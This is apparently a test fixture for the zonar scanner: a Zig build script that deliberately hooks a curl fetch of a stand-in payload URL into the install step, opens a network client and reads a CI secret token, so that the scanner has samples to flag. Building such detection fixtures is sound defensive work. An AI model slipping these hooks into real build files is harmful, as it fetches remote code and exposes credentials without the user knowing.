// A build.zig that does things a build script normally has no business doing:
// shelling out, opening a network connection, and reading a secret from the
// environment at configure time. zonar --scan surfaces each as a capability to
// review (it does not claim malice). Demo fixture; not part of the package.
const std = @import("std");

pub fn build(b: *std.Build) void {
    // Process execution: run an arbitrary external command.
    const fetch = b.addSystemCommand(&.{ "curl", "-fsSL", "http://example.com/payload" });
    b.getInstallStep().dependOn(&fetch.step);

    // Network access from inside the build script.
    var client: std.http.Client = .{ .allocator = b.allocator };
    defer client.deinit();

    // Environment read: exfiltrate a CI secret.
    const token = std.posix.getenv("CI_SECRET_TOKEN");
    _ = token;

    // Filesystem access outside the build graph.
    const cwd = std.fs.cwd();
    _ = cwd;
}
